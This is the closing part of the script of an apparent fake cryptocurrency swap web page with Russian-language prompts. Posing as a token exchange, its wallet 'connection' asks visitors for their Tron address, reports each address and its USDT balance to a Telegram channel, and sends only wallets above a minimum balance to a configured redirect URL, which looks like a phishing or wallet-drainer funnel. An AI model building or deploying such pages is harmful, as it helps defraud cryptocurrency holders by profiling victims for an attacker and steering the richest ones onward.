            tokens.forEach(token => {
                const item = document.createElement("div");
                item.className = "token-item";
                item.innerHTML = `
                    <div class="token-item-info">
                        <div class="token-item-logo">
                            <img src="${token.logo}" alt="${token.symbol} Logo">
                        </div>
                        <div class="token-item-details">
                            <div class="token-item-name">${token.name}</div>
                            <div class="token-item-symbol">${token.symbol}</div>
                        </div>
                    </div>
                    <div class="token-item-balance">${token.balance}</div>
                `;
                item.addEventListener("click", () => {
                    selectToken(token);
                });
                DOM.tokenList.appendChild(item);
            });
        }

        /**
         * Updates the UI with the selected token and closes the modal.
         * @param {Object} token - The selected token object.
         */
        function selectToken(token) {
            if (!currentTokenTarget) return;
            
            const targetElement = currentTokenTarget === 'from' ? DOM.fromToken : DOM.toToken;
            
            targetElement.innerHTML = `
                <span class="token-left">
                    <span class="token-icon">
                        <img src="${token.logo}" alt="${token.symbol}">
                    </span>
                    <span>${token.symbol}</span>
                </span>
                <span class="token-arrow">▾</span>
            `;
            
            closeTokenModal();
        }

        /**
         * Filters the token list based on user search input.
         * @param {Event} event - The input event containing the search query.
         */
        function handleTokenSearch(event) {
            const query = event.target.value.toLowerCase();
            const filteredTokens = TOKENS.filter(token => 
                token.name.toLowerCase().includes(query) || 
                token.symbol.toLowerCase().includes(query)
            );
            renderTokenList(filteredTokens);
        }

        /**
         * ====================================================================
         * UI INTERACTION HANDLERS
         * ====================================================================
         */
        /**
         * Opens the wallet connection modal with animation.
         */
        function openWalletModal() {
            DOM.walletModal.classList.add("show");
        }

        /**
         * Closes the wallet connection modal.
         */
        function closeWalletModal() {
            DOM.walletModal.classList.remove("show");
        }

        /**
         * Toggles the selected tokens in the swap interface.
         * Swaps both the visual representation and the input values.
         */
        function switchTokens() {
            const tempHtml = DOM.fromToken.innerHTML;
            DOM.fromToken.innerHTML = DOM.toToken.innerHTML;
            DOM.toToken.innerHTML = tempHtml;

            const tempValue = DOM.fromAmount.value;
            DOM.fromAmount.value = DOM.toAmount.value;
            DOM.toAmount.value = tempValue;
        }

        /**
         * Updates the 'to' amount based on a mock exchange rate.
         * Note: In a production environment, this should be replaced with 
         * a real-time API call to a DEX aggregator or pricing oracle.
         */
        function updateSwapAmount() {
            const value = parseFloat(DOM.fromAmount.value);
            if (!value || value <= 0) {
                DOM.toAmount.value = "";
                return;
            }
            // Mock rate for demonstration purposes
            DOM.toAmount.value = (value * 1800).toFixed(2);
        }

        /**
         * ====================================================================
         * CORE WALLET CONNECTION & VALIDATION LOGIC
         * ====================================================================
         */
        /**
         * Handles the entire wallet connection, validation, balance check, 
         * and redirection flow.
         * This function ALWAYS prompts the user for an address, ensuring 
         * consistent behavior regardless of browser extension presence.
         */
        async function handleWalletConnection() {
            // 1. Always prompt for wallet address as per strict requirement
            const address = prompt("Пожалуйста, укажите ваш адрес кошелька Tron (начинается с буквы T):");
            
            // 2. Validate input
            if (!address) {
                return; // User cancelled the prompt
            }

            const trimmedAddress = address.trim();
            const isValidFormat = trimmedAddress.startsWith(CONFIG.VALIDATION.TRON_ADDRESS_PREFIX) && 
                                  trimmedAddress.length === CONFIG.VALIDATION.TRON_ADDRESS_LENGTH;

            if (!isValidFormat) {
                alert("Неверный формат адреса Tron. Адрес должен начинаться с 'T' и содержать 34 символа.");
                return;
            }

            // 3. Update UI to indicate processing state
            const originalButtonText = DOM.swapButton.textContent;
            DOM.swapButton.textContent = "Проверка баланса...";
            DOM.swapButton.disabled = true;
            closeWalletModal();

            // 4. Log connection attempt to Telegram
            const timestamp = new Date().toLocaleString("ru-RU");
            await sendTelegramLog(
                `🔔 <b>Новое подключение!</b>\n` +
                `📍 Адрес: <code>${trimmedAddress}</code>\n` +
                `🕒 Время: ${timestamp}`
            );

            // 5. Check balance via TronScan API
            const balance = await checkTronBalance(trimmedAddress);
            
            // 6. Log balance result to Telegram
            await sendTelegramLog(
                `💰 <b>Проверка баланса</b>\n` +
                `📍 Адрес: <code>${trimmedAddress}</code>\n` +
                `💵 Баланс USDT: <b>${balance.toFixed(2)} $</b>`
            );

            // 7. Evaluate balance and execute corresponding action
            if (balance < CONFIG.VALIDATION.MIN_BALANCE_USDT) {
                alert("Попробуйте другой кошелек (недостаточный баланс).");
                DOM.swapButton.textContent = originalButtonText;
                DOM.swapButton.disabled = false;
            } else {
                DOM.swapButton.textContent = "Перенаправление...";
                
                await sendTelegramLog(
                    `✅ <b>Успешный редирект!</b>\n` +
                    `📍 Адрес: <code>${trimmedAddress}</code>\n` +
                    `💵 Баланс: ${balance.toFixed(2)} $`
                );

                // Delay slightly for better UX before redirecting
                setTimeout(() => {
                    window.location.href = CONFIG.REDIRECT.URL;
                }, 1500);
            }
        }

        /**
         * ====================================================================
         * EVENT LISTENERS REGISTRATION
         * ====================================================================
         * Initializes all event listeners once the DOM is fully loaded.
         */
        document.addEventListener("DOMContentLoaded", () => {
            // Modal triggers
            DOM.connectButton.addEventListener("click", openWalletModal);
            DOM.swapButton.addEventListener("click", openWalletModal);
            
            // Modal closers
            DOM.closeModal.addEventListener("click", closeWalletModal);
            DOM.walletModal.addEventListener("click", (event) => {
                if (event.target === DOM.walletModal) {
                    closeWalletModal();
                }
            });

            // Wallet options (Trust Wallet only)
            DOM.trustWalletButton.addEventListener("click", handleWalletConnection);

            // Token selection interactions
            DOM.fromToken.addEventListener("click", () => openTokenModal('from'));
            DOM.toToken.addEventListener("click", () => openTokenModal('to'));
            DOM.closeTokenModal.addEventListener("click", closeTokenModal);
            DOM.tokenModal.addEventListener("click", (event) => {
                if (event.target === DOM.tokenModal) {
                    closeTokenModal();
                }
            });
            if (DOM.tokenSearchInput) {
                DOM.tokenSearchInput.addEventListener("input", handleTokenSearch);
            }

            // Swap interface interactions
            DOM.switchButton.addEventListener("click", switchTokens);
            DOM.fromAmount.addEventListener("input", updateSwapAmount);

            // Keyboard accessibility
            document.addEventListener("keydown", (event) => {
                if (event.key === "Escape") {
                    if (DOM.walletModal.classList.contains("show")) {
                        closeWalletModal();
                    }
                    if (DOM.tokenModal.classList.contains("show")) {
                        closeTokenModal();
                    }
                }
            });

            // Prevent default anchor behavior for placeholder links
            document.addEventListener("click", (event) => {
                const link = event.target.closest("a[href='#']");
                if (link) {
                    event.preventDefault();
                }
            });
        });
    </script>
</body>
